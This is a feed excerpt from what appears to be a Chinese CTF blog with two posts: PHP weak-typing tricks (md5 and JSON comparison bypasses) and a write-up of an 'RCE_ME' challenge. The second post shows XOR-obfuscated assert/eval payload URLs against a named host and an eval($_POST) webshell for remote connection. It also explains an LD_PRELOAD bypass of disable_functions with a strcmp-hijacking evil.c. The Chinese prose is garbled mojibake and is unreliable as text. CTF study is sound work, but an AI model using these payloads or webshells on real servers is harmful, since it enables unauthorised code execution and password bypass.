    <id>https://0xcreed.jxustctf.top/2019/11/phpå¼±ç±»å‹/</id>
    <published>2019-11-01T14:25:43.000Z</published>
    <updated>2019-11-03T04:56:16.783Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="å¼±ç±»å‹ä¸å¼ºç±»å‹"><a href="#å¼±ç±»å‹ä¸å¼ºç±»å‹" class="headerlink" title="å¼±ç±»å‹ä¸å¼ºç±»å‹"></a>å¼±ç±»å‹ä¸å¼ºç±»å‹</h2><p>é€šå¸¸è¯­è¨€æœ‰å¼ºç±»å‹å’Œå¼±ç±»å‹ä¸¤ç§ï¼Œå¼ºç±»å‹æŒ‡çš„æ˜¯å¼ºåˆ¶æ•°æ®ç±»å‹çš„è¯­è¨€ï¼Œå°±æ˜¯è¯´ï¼Œä¸€ä¸ªå˜é‡ä¸€æ—¦è¢«å®šä¹‰äº†æŸä¸ªç±»å‹ï¼Œå¦‚æœä¸ç»è¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œè¿™ä¸ªå˜é‡å°±ä¸€ç›´æ˜¯è¿™ä¸ªç±»å‹ï¼Œåœ¨å˜é‡ä½¿ç”¨ä¹‹å‰å¿…é¡»å£°æ˜å˜é‡çš„ç±»å‹å’Œåç§°ï¼Œä¸”ä¸ç»å¼ºåˆ¶è½¬æ¢ä¸å…è®¸ä¸¤ç§ä¸åŒç±»å‹çš„å˜é‡äº’ç›¸æ“ä½œã€‚è€Œå¼±ç±»å‹è¯­è¨€ï¼Œä¸ä¼šæ£€æŸ¥å˜é‡ç±»å‹ï¼Œå¯ä»¥éšæ—¶çš„è½¬æ¢å˜é‡ç±»å‹ã€‚</p><a id="more"></a><p>åœ¨phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$x=<span class="number">1</span>;</span><br><span class="line">$x=<span class="string">"string"</span>;<span class="comment">//éšæ„è½¬æ¢å˜é‡ç±»å‹</span></span><br></pre></td></tr></table></figure><p>ä½†åœ¨Cè¯­è¨€ä¸­ä»»ä½•å˜é‡éƒ½è¦å…ˆå®šä¹‰å˜é‡ç±»å‹ï¼Œå†è¿›è¡Œèµ‹å€¼ã€‚</p><h2 id="æ¯”è¾ƒæ“ä½œç¬¦"><a href="#æ¯”è¾ƒæ“ä½œç¬¦" class="headerlink" title="æ¯”è¾ƒæ“ä½œç¬¦"></a>æ¯”è¾ƒæ“ä½œç¬¦</h2><p>åœ¨ç¼–ç¨‹ä¸­ç±»å‹è½¬æ¢æ˜¯ä¸å¯é¿å…çš„ä¸€ä¸ªäº‹æƒ…ï¼Œæ¯”å¦‚è¯´ç½‘ç»œç¼–ç¨‹ä¸­getæ–¹æ³•æˆ–è€…postæ–¹æ³•ä¼ å…¥ä¸€ä¸ªéœ€è¦è½¬æ¢æˆintçš„å€¼ï¼Œå†æ¯”å¦‚è¯´å˜é‡é—´è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œéœ€è¦å°†å˜é‡è¿›è¡Œè½¬æ¢ï¼Œé‰´äºphpæ˜¯è‡ªåŠ¨è¿›è¡Œç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥ä¼šå¼•å‘å¾ˆå¤šæ„æƒ³ä¸åˆ°çš„é—®é¢˜ã€‚</p><p>phpæœ‰ä¸¤ç§æ¯”è¾ƒæ–¹å¼,ä¸€ç§æ˜¯â€œ= =â€ ä¸€ç§æ˜¯â€œ= = =â€è¿™ä¸¤ç§éƒ½å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªæ•°å­—çš„å¤§å°ï¼Œä½†æ˜¯æœ‰å¾ˆæ˜æ˜¾çš„åŒºåˆ«ã€‚</p><p>â€œ= =â€ï¼šä¼šæŠŠä¸¤ç«¯å˜é‡ç±»å‹è½¬æ¢æˆç›¸åŒçš„ï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p><p>â€œ= = =â€ï¼šä¼šå…ˆåˆ¤æ–­ä¸¤ç«¯å˜é‡ç±»å‹æ˜¯å¦ç›¸åŒï¼Œåœ¨è¿›è¡Œæ¯”è¾ƒã€‚</p><h2 id="ç±»å‹è½¬æ¢é—®é¢˜"><a href="#ç±»å‹è½¬æ¢é—®é¢˜" class="headerlink" title="ç±»å‹è½¬æ¢é—®é¢˜"></a>ç±»å‹è½¬æ¢é—®é¢˜</h2><p>phpä¸­æœ€å¸¸è§çš„å°±æ˜¯string è½¬intï¼Œæˆ–è€…intè½¬stringã€‚</p><p>ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯å¼ºåˆ¶ç±»å‹è½¬æ¢<code>(string)$x</code>æˆ–<code>strval($x)</code>,<code>(int)$x</code>æˆ–<code>intval($X)</code>,äºŒæ˜¯æ ¹æ®è¿ç®—ç¬¦è‡ªåŠ¨è½¬æ¢ã€‚</p><p>ä¾‹å¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="number">123</span>;var_dump($a); <span class="comment">//int(123)</span></span><br><span class="line">var_dump($a + <span class="string">"123"</span>); <span class="comment">//int(246)</span></span><br><span class="line">var_dump($a . <span class="string">"123"</span>); <span class="comment">//string(6) "123123"</span></span><br><span class="line">var_dump($a ==<span class="string">"123a1"</span>); <span class="comment">//bool(true)</span></span><br><span class="line">var_dump($a == <span class="string">"123e1"</span>); <span class="comment">//bool(false)</span></span><br><span class="line">var_dump($a == <span class="string">"12.3e1"</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯è¿ç®—ç¬¦åˆ™ä¼šè‡ªåŠ¨è½¬æ¢æˆæ•°å€¼å†è¿›è¡Œè®¡ç®—ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²è¿ç®—ç¬¦åˆ™è½¬æ¢æˆå­—ç¬¦ä¸²å†è®¡ç®—</p><p>å¦‚æœæ˜¯â€œ==â€ï¼Œåˆ™ä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å€¼ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€™eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</p><h2 id="hashç»•è¿‡"><a href="#hashç»•è¿‡" class="headerlink" title="hashç»•è¿‡"></a>hashç»•è¿‡</h2><p>hash1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//å‡è®¾flagçš„å€¼ä¸å¯è§</span></span><br><span class="line">$int =<span class="number">0</span>;  <span class="comment">//ä¸º$intèµ‹å€¼ ä½¿å…¶æ»¡è¶³ifçš„æ¡ä»¶</span></span><br><span class="line"><span class="keyword">if</span>($flag !== $int &amp;&amp; md5($flag) == $int) <span class="comment">//æ³¨æ„"ï¼==" å…ˆåˆ¤æ–­ç±»å‹</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"correct\n"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"incorrect\n"</span>;</span><br></pre></td></tr></table></figure><p>ä¸º$intèµ‹ä½•å€¼ï¼Œæ‰èƒ½æ»¡è¶³æ¡ä»¶ï¼Ÿ</p><p>å…ˆçœ‹ä¸‹é¢å‡ ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$flag1 = <span class="string">"&#123;You_can't_see_me&#125;"</span>;</span><br><span class="line">$flag2 = <span class="string">"&#123;You_can't_see&#125;"</span>;</span><br><span class="line">$flag3 = <span class="string">"&#123;You_can't_se&#125;"</span>;</span><br><span class="line"></span><br><span class="line">var_dump(md5($flag1));  <span class="comment">//string(32) "dc39eb7c561e8753d2ce41cb2e1f798b"</span></span><br><span class="line">var_dump(intval(md5($flag1)));  <span class="comment">//int(0)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag2));  <span class="comment">//string(32) "2e2e029620ec42eb68bc24e88d35b027"</span></span><br><span class="line">var_dump(intval(md5($flag2)));  <span class="comment">//int(200)</span></span><br><span class="line"></span><br><span class="line">var_dump(md5($flag3));  <span class="comment">//string(32) "58a39a758897868896d56904481fb4a0"</span></span><br><span class="line">var_dump(intval(md5($flag3)));  <span class="comment">//int(58)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">"1e1q"</span> == <span class="number">10</span>);  <span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="string">"1eq"</span> == <span class="number">1</span>);  <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><p>ä¸éš¾çœ‹å‡ºï¼Œä¸è®º$flagçš„å€¼æ˜¯ä»€ä¹ˆï¼Œmd5å‡½æ•°éƒ½ä¼šè¿”å›32ä½çš„16è¿›åˆ¶æ•°ï¼Œåˆ©ç”¨è½¬æ¢æ¼æ´ï¼Œå¯ä»¥è½»æ¾çˆ†ç ´ï¼Œä»è€Œç»•è¿‡ã€‚ä½†å¦‚æœeåé¢æœ‰æ¯”è¾ƒé•¿çš„çº¯æ•°å­—å­—ç¬¦é‚£ä¹ˆå°±åˆ«æƒ³ç€çˆ†ç ´äº†(æ¦‚ç‡è¾ƒå°)ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"&#123;This_is_a_test!!!!&#125;"</span>; <span class="comment">//å‡è®¾flagçš„å€¼ä¸å¯è§</span></span><br><span class="line">$i=<span class="number">0</span>;</span><br><span class="line">$j=intval(md5($flag));</span><br><span class="line"><span class="keyword">while</span>($i!=$j)</span><br><span class="line">&#123;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $i; <span class="comment">//721</span></span><br></pre></td></tr></table></figure><h2 id="jsonç»•è¿‡"><a href="#jsonç»•è¿‡" class="headerlink" title="jsonç»•è¿‡"></a>jsonç»•è¿‡</h2><p> JSON æ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®æ ¼å¼ï¼Œä»–åŸºäº javascript è¯­æ³•çš„å­é›†ï¼Œå³æ•°ç»„å’Œå¯¹è±¡è¡¨ç¤ºã€‚ç”±äºä½¿ç”¨çš„æ˜¯ javascript è¯­æ³•ï¼Œå› æ­¤JSON å®šä¹‰å¯ä»¥åŒ…å«åœ¨javascript æ–‡ä»¶ä¸­ï¼Œå¯¹å…¶çš„è®¿é—®æ— éœ€é€šè¿‡åŸºäº XML çš„è¯­è¨€æ¥é¢å¤–è§£æ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"abc"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> è¾“å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œjsonè§£ç ï¼Œå¦‚æœè§£ç åçš„messageä¸keyå€¼ç›¸åŒï¼Œä¼šå¾—åˆ°flagï¼Œä¸»è¦æ€æƒ³è¿˜æ˜¯å¼±ç±»å‹è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬ä¸çŸ¥é“keyå€¼æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ä¸€ä»¶äº‹å°±æ˜¯å®ƒè‚¯å®šæ˜¯å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸Šæ–‡è®²è¿‡ï¼Œä¸¤ä¸ªç­‰å·æ—¶ä¼šè½¬åŒ–æˆåŒä¸€ç±»å‹å†è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥æ„é€ ä¸€ä¸ªæ•°å€¼å°±å¯ä»¥ç›¸ç­‰äº†ã€‚æœ€ç»ˆpayload message={â€œkeyâ€:0}ã€‚ å¦‚æœ$keyä¸­çš„å­—ç¬¦ä¸²å¼€å¤´å¹¶ä¸æ˜¯å­—æ¯ï¼Œåˆ™éœ€è¦æˆ‘ä»¬å»çˆ†ç ´ã€‚</p><p><a href="https://www.cnblogs.com/anbus/p/10000571.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p>]]></content>
    
    <summary type="html">
    
      æœ€è¿‘ç¢°åˆ°ä¸€é“å¼±ç±»å‹çš„é¢˜ç›®ï¼Œå¯¹phpå¼±ç±»å‹ç†è§£æ›´æ·±äº†
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="å¼±ç±»å‹" scheme="https://0xcreed.jxustctf.top/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>bypass_disable_functions</title>
    <link href="https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/"/>
    <id>https://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/</id>
    <published>2019-10-30T06:21:21.000Z</published>
    <updated>2019-12-24T14:47:03.234Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE_ME"></a><a href="http://114.116.44.23:40001/" target="_blank" rel="noopener">RCE_ME</a></h2><h3 id="ç»•è¿‡-amp-è·å–shell"><a href="#ç»•è¿‡-amp-è·å–shell" class="headerlink" title="ç»•è¿‡&amp;è·å–shell"></a>ç»•è¿‡&amp;è·å–shell</h3><p><img src="/2019/10/bypass-disable-functions/image-20191030142752981.png" alt="image-20191030142752981"></p><p>æ ¹æ®ä»£ç è¦æ±‚ï¼š</p><ol><li><p>é•¿åº¦ä¸èƒ½å¤§äº40</p></li><li><p>ä¸èƒ½åŒ…å«å¤§å°å†™å­—æ¯ï¼Œæ•°å­—</p></li></ol><p>åœ¨PHPä¸­ä¸¤ä¸ªå­—ç¬¦å¼‚æˆ–å¯ä»¥å¾—åˆ°å¦å¤–ä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹å¦‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"!"</span> ^ <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030150348065.png" alt="image-20191030150348065"></p><p>åˆ©ç”¨è¿™ç‚¹æˆ‘ä»¬å°±èƒ½ç»•è¿‡å¯¹å­—æ¯æ•°å­—çš„è¿‡æ»¤</p><p>ä¹‹åæˆ‘ä»¬è¦ç»•è¿‡å¯¹é•¿åº¦çš„é™åˆ¶ï¼Œ40å­—ç¬¦å®åœ¨æ˜¯é™åˆ¶å¤ªå¤§äº†</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo(); //æ„é€ payloadæ‰§è¡Œphpå‡½æ•°</span></span><br><span class="line">$_=<span class="string">"`&#123;&#123;&#123;"</span>^<span class="string">"?&lt;&gt;/"</span>;</span><br><span class="line">var_dump($_);      <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">var_dump(urldecode(<span class="string">"%fe%fe%fe%fe"</span>)^urldecode(<span class="string">"%a1%b9%bb%aa"</span>)); <span class="comment">//string(4) "_GET"</span></span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line"><span class="comment">#$_GET[_]($_GET[__])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&amp;_=assert</span></span><br><span class="line"><span class="comment">#&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">//code=assert(eval($_GET[a])&amp;a=phpinfo();)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030152007908.png" alt="image-20191030152007908"></p><p>æ¥ç€æ„é€ payloadè®©èšå‰‘æ¥è¿</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">114.116</span>.<span class="number">44.23</span>:<span class="number">40001</span>/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[<span class="number">_</span>]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_<span class="number">_</span>]);&amp;<span class="number">_</span>=assert&amp;_<span class="number">_</span>=<span class="keyword">eval</span>($_POST[%27a%27])</span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030152338199.png" alt="image-20191030152338199"></p><p><img src="/2019/10/bypass-disable-functions/image-20191030152446769.png" alt="image-20191030152446769"></p><p>flagåªæœ‰rootæƒé™æ‰èƒ½è®¿é—®ï¼Œreadflagä¼°è®¡æ˜¯ç”¨æ¥è¯»flagçš„ã€‚</p><p>ç›´æ¥åœ¨è™šæ‹Ÿç»ˆç«¯ä¸­æ‰§è¡Œreadflagå‘½ä»¤</p><p><img src="/2019/10/bypass-disable-functions/image-20191030152803007.png" alt="image-20191030152803007"></p><p>å‘ç°å‘½ä»¤éƒ½æ— æ³•æ‰§è¡Œï¼ŒæŸ¥çœ‹phpinfo()ï¼›ä¼°è®¡æ˜¯è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°è¢«ç¦ç”¨äº†</p><p> <img src="/2019/10/bypass-disable-functions/1571499768310.png" alt="1571499768310"> </p><h3 id="bypass-disable-functions"><a href="#bypass-disable-functions" class="headerlink" title="bypass_disable_functions"></a>bypass_disable_functions</h3><p>ä¸€èˆ¬è€Œè¨€ï¼Œåˆ©ç”¨æ¼æ´æ§åˆ¶ web å¯åŠ¨æ–°è¿›ç¨‹ a.binï¼Œa.bin å†…éƒ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•° b()ï¼Œb()  ä½äºç³»ç»Ÿå…±äº«å¯¹è±¡ c.so ä¸­ï¼Œæ‰€ä»¥ç³»ç»Ÿä¸ºè¯¥è¿›ç¨‹åŠ è½½å…± c.soï¼Œæƒ³æ³•åœ¨ c.so å‰ä¼˜å…ˆåŠ è½½å¯æ§çš„ c_evil.soï¼Œc_evil.so  å†…å«ä¸ b() åŒåçš„æ¶æ„å‡½æ•°ï¼Œç”±äº c_evil.so ä¼˜å…ˆçº§è¾ƒé«˜ï¼Œæ‰€ä»¥ï¼Œa.bin å°†è°ƒç”¨åˆ° c_evil.so å†… b() è€Œéç³»ç»Ÿçš„  c.so å†… b()ï¼ŒåŒæ—¶ï¼Œc_evil.so å¯æ§ï¼Œè¾¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç çš„ç›®çš„ã€‚åŸºäºè¿™ä¸€æ€è·¯ï¼Œå¸¸è§çªç ´ disable_functions  é™åˆ¶æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼ä¸ºï¼š</p><ul><li>ç¼–å†™ä¸€ä¸ªåŸå‹ä¸º uid_t getuid(void); çš„ C å‡½æ•°ï¼Œå†…éƒ¨æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œå¹¶ç¼–è¯‘æˆå…±äº«å¯¹è±¡ getuid_shadow.soï¼›</li><li>è¿è¡Œ PHP å‡½æ•° putenv()ï¼Œè®¾å®šç¯å¢ƒå˜é‡ LD_PRELOAD ä¸º getuid_shadow.soï¼Œä»¥ä¾¿åç»­å¯åŠ¨æ–°è¿›ç¨‹æ—¶ä¼˜å…ˆåŠ è½½è¯¥å…±äº«å¯¹è±¡ï¼›( LD_PRELOADæ˜¯Unixä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºå®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ï¼ŒLDå’ŒåŠ¨æ€åº“æœ‰å…³ï¼ŒPRELOADè¡¨ç¤ºé¢„åŠ è½½ï¼Œç»“åˆèµ·æ¥å°±æ˜¯é¢„å…ˆåŠ è½½çš„åŠ¨æ€åº“ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œå¯ä»¥è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ä¸­çš„å‡½æ•°ã€‚)</li><li>è¿è¡Œ PHP çš„ mail() å‡½æ•°ï¼Œmail() å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹ /usr/sbin/sendmailï¼Œç”±äºä¸Šä¸€æ­¥  LD_PRELOAD çš„ä½œç”¨ï¼Œsendmail è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° getuid() è¢«ä¼˜å…ˆçº§æ›´å¥½çš„ getuid_shadow.so ä¸­çš„åŒå  getuid() æ‰€åŠ«æŒï¼›</li><li>è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆsystem()ã€exec() ç­‰ç­‰ï¼‰ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚</li></ul><h4 id="a-cæ–‡ä»¶ï¼š"><a href="#a-cæ–‡ä»¶ï¼š" class="headerlink" title="a.cæ–‡ä»¶ï¼š"></a>a.cæ–‡ä»¶ï¼š</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> passwd[]=<span class="string">"123456"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input password!\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(passwd,argv[<span class="number">1</span>]))&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Correct\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Invalid\n"</span>);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/bypass-disable-functions/image-20191030171503480.png" alt="image-20191030171503480"></p><p> å¦‚æœæ˜¯ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥ç¼–å†™ä¸€ä¸ªåŠ¨æ€å‡½æ•°åº“æ¥è¦†ç›–æ‰strcmpå‡½æ•°æ’è¿”å›0ä»¥è¾¾åˆ°ä»»æ„å¯†ç éƒ½è¿”å›Correct </p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-fPIC ä½œç”¨äºç¼–è¯‘é˜¶æ®µï¼Œå‘Šè¯‰ç¼–è¯‘å™¨äº§ç”Ÿä¸ä½ç½®æ— å…³ä»£ç (<span class="built_in">Position</span>-<span class="literal">Independent</span> Code)ï¼Œ åˆ™äº§ç”Ÿçš„ä»£ç ä¸­ï¼Œæ²¡æœ‰ç»å¯¹åœ°å€ï¼Œå…¨éƒ¨ä½¿ç”¨ç›¸å¯¹åœ°å€ï¼Œæ•…è€Œä»£ç å¯ä»¥è¢«åŠ è½½å™¨åŠ è½½åˆ°å†…å­˜çš„ä»»æ„ ä½ç½®ï¼Œéƒ½å¯ä»¥æ­£ç¡®çš„æ‰§è¡Œã€‚è¿™æ­£æ˜¯å…±äº«åº“æ‰€è¦æ±‚çš„ï¼Œå…±äº«åº“è¢«åŠ è½½æ—¶ï¼Œåœ¨å†…å­˜çš„ä½ç½®ä¸æ˜¯å›ºå®šçš„</span><br></pre></td></tr></table></figure><p>evil.cæ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s1,<span class="keyword">const</span> <span class="keyword">char</span> *s2)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"evil function\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img 